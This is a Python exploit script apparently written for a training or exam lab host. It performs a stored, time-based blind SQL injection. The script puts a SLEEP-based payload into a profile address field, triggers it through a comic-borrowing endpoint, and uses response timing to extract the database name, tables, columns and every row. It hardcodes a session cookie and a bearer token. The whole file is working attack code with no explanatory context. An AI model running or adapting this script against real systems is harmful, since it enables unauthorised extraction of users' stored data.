import requests
import time

# Configuration
HOST = "kobos.exam.cyberjutsu-lab.tech"
PROFILE_INFO_URL = f"https://{HOST}/api/profile/info"
BORROW_URL = f"https://{HOST}/api/comics/borrow"
RETURN_URL = f"https://{HOST}/api/comics/return"
CHAPTER_ID = "1"

HEADERS = {
    "Host": HOST,
    "Cookie": "ci_session=770710f1ce51023a62a787350eddf497",
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Content-Type": "application/json",
    "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiI3NyIsImVtYWlsIjoidGVzdDMyMUBhYmMuY29tIiwidXNlcm5hbWUiOiJ0ZXN0MzIxIiwiaWF0IjoxNzUxMTE3NjE0LCJleHAiOjE3NTExNjA4MTR9.I44wOfR2GkOaSRmdBeMtw3MmD-8OKesC8yxPf6gHXVI",
}

session = requests.Session()
session.headers.update(HEADERS)

SLEEP_DURATION = 3
THRESHOLD = SLEEP_DURATION - 1  # 2 seconds

def update_profile(address_payload):
    payload = {"address": address_payload, "telephone": "123456789"}
    resp = session.put(PROFILE_INFO_URL, json=payload, timeout=20)
    return resp.status_code == 200

def borrow_chapter():
    payload = {"chapter_id": CHAPTER_ID}
    start_time = time.time()
    try:
        resp = session.post(BORROW_URL, json=payload, timeout=SLEEP_DURATION + 10)
        elapsed = time.time() - start_time
        if resp.status_code != 200:
            return elapsed, False
        return elapsed, True
    except requests.exceptions.Timeout:
        elapsed = time.time() - start_time
        return elapsed, False
    except Exception:
        return 0, False

def return_chapter():
    payload = {
        "chapter_id": CHAPTER_ID,
        "feedback": "reset",
        "rating": 1,
        "platform_feedback": ""
    }
    try:
        resp = session.post(RETURN_URL, json=payload, timeout=20)
        if resp.status_code == 400:
            return True
        return resp.status_code == 200
    except Exception:
        return False

def reset_borrowed_chapter():
    return_chapter()
    time.sleep(1)

def test_condition(condition):
    payload = f"' OR IF({condition},SLEEP({SLEEP_DURATION}),0) OR '"
    if not update_profile(payload):
        return False, ""
    reset_borrowed_chapter()
    elapsed, success = borrow_chapter()
    if not success:
        return False, ""
    time.sleep(1)
    return_chapter()
    return elapsed > THRESHOLD, ""

def extract_data(query, max_len=50):
    result = ""
    for idx in range(1, max_len + 1):
        low, high = 0, 127
        while low <= high:
            mid = (low + high) // 2
            condition = f"ASCII(SUBSTRING(({query}),{idx},1))>{mid}"
            triggered, _ = test_condition(condition)
            if triggered:
                low = mid + 1
            else:
                high = mid - 1
        if low == 0:
            break
        result += chr(low)
        print(f"Extracted: {result}")
    return result

def dump_database():
    reset_borrowed_chapter()
    db_name = extract_data("SELECT DATABASE()")
    print(f"\n[+] Database: {db_name}\n")
    tables = []
    tables_query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}'"
    for i in range(1, 20):
        table = extract_data(f"({tables_query} LIMIT {i-1},1)")
        if not table:
            break
        tables.append(table)
        print(f"\n[+] Table {i}: {table}")
    for table in tables:
        print(f"\n[+] Dumping table: {table}")
        columns_query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db_name}' AND table_name='{table}'"
        columns = []
        for i in range(1, 20):
            column = extract_data(f"({columns_query} LIMIT {i-1},1)")
            if not column:
                break
            columns.append(column)
        for i in range(1, 100):
            concat_columns = ",'|',".join([f"COALESCE(`{col}`,'NULL')" for col in columns])
            row_query = f"SELECT CONCAT({concat_columns}) FROM `{table}` LIMIT {i-1},1"
            row = extract_data(row_query, max_len=500)
            if not row:
                break
            print(f"Row {i}: {row}")

if __name__ == "__main__":
    dump_database()
